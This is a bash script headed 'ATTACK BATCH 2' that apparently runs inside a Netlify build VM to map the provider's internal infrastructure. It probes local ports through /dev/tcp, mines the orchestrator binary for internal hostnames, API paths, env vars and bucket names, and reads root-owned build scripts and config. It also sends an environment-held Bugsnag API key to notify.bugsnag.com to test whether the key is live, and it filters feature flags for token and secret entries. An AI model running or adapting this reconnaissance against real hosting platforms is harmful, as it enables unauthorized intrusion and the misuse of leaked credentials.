#!/usr/bin/env bash
# ============================================================================
# ATTACK BATCH 2 -- runs inside the build VM.
# Target: the orchestrator binary (world-readable, 55.9MB Go) + the local
# listening surface + the agent-runner. Read-only. No writes to Netlify infra.
# ============================================================================
set +e
B=/opt/build-bin/buildbot
hr () { echo; echo "=============== $* ==============="; }

hr "1. what is actually LISTENING inside this VM"
(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | head -30
echo "--- localhost probes (incl. the .ntlfy-dev endpoint named in the binary) ---"
for p in 8888 8000 8080 3000 5000 9000 2019 4646 8500 15000 15001 9901; do
  printf "  127.0.0.1:%-6s " "$p"
  timeout 2 bash -c "cat </dev/null >/dev/tcp/127.0.0.1/$p" 2>/dev/null && echo OPEN || echo closed
done
for u in "http://localhost:8888/.ntlfy-dev/health" "http://127.0.0.1:8888/" ; do
  printf "  %-46s -> " "$u"
  timeout 4 curl -s -o /tmp/l.out -w '%{http_code} ' "$u" 2>/dev/null || printf 'TIMEOUT '
  head -c 150 /tmp/l.out 2>/dev/null | tr -d '\n'; echo
done

hr "2. EVERY netlify-owned hostname inside the orchestrator"
strings -n 6 "$B" 2>/dev/null \
 | grep -oE '[a-z0-9][a-z0-9.-]*\.(nsvcs\.net|netlify\.com|netlifysdk\.com|netlify\.app)' \
 | sort -u | head -80

hr "3. API paths the orchestrator calls"
strings -n 8 "$B" 2>/dev/null \
 | grep -oE '/api/v[0-9]+/[a-zA-Z0-9_{}/.:-]{3,60}' | sort -u | head -80

hr "4. every NETLIFY_* / BUILDBOT_* env var it reads"
strings -n 6 "$B" 2>/dev/null \
 | grep -oE '\b(NETLIFY|BUILDBOT|NF)_[A-Z0-9_]{2,50}\b' | sort -u | head -80

hr "5. custom HTTP headers it knows"
strings -n 8 "$B" 2>/dev/null \
 | grep -oE '\b(Netlify|X-Nf|X-Netlify|Nf)-[A-Za-z0-9-]{2,40}\b' | sort -u | head -60

hr "6. S3 buckets / kafka topics / queue names"
strings -n 8 "$B" 2>/dev/null \
 | grep -oE '\b(netlify|nf|bitballoon)[a-z0-9._-]{4,50}\b' | sort -u | head -60

hr "7. the agent-runner surface (new product, runs in this same infra)"
strings -n 6 "$B" 2>/dev/null | grep -iE 'agent[_-]runner' | sort -u | head -40

hr "8. is the Bugsnag build key live? (no-PII liveness proof only)"
K="$BUGSNAG_KEY_BUILD_INFO"
echo "  BUGSNAG_KEY_BUILD_INFO len=${#K} sha256=$(printf %s "$K" | sha256sum | cut -c1-16)"
printf "  POST notify.bugsnag.com with EMPTY payload (expect 400 if key is live, 401 if not) -> "
timeout 8 curl -s -o /tmp/bs.out -w '%{http_code} ' -X POST https://notify.bugsnag.com/ \
  -H "Bugsnag-Api-Key: $K" -H 'Content-Type: application/json' -H 'Bugsnag-Payload-Version: 5' \
  --data '{}' 2>/dev/null || printf 'ERR '
head -c 120 /tmp/bs.out 2>/dev/null | tr -d '\n'; echo

hr "9. other readable root-owned files worth reading"
ls -la /opt/build-bin/
echo "--- entrypoint ---"; head -60 /opt/build-bin/entrypoint 2>/dev/null
echo "--- build ---";      head -40 /opt/build-bin/build 2>/dev/null
echo "--- dev-server ---"; cat /opt/build-bin/dev-server 2>/dev/null
echo "--- root .gitconfig (copied into the image) ---"; cat /opt/buildhome/.gitconfig 2>/dev/null

hr "10. FEATURE_FLAGS delivered to THIS context"
echo "  context=$CONTEXT pull_request=${PULL_REQUEST:-unset} count=$(echo "$FEATURE_FLAGS" | tr ',' '\n' | wc -l)"
echo "$FEATURE_FLAGS" | tr ',' '\n' | grep -iE 'token|secret|auth|encrypt|permission|sso|access|jigsaw|blobs|scan' | sed 's/^/    /'
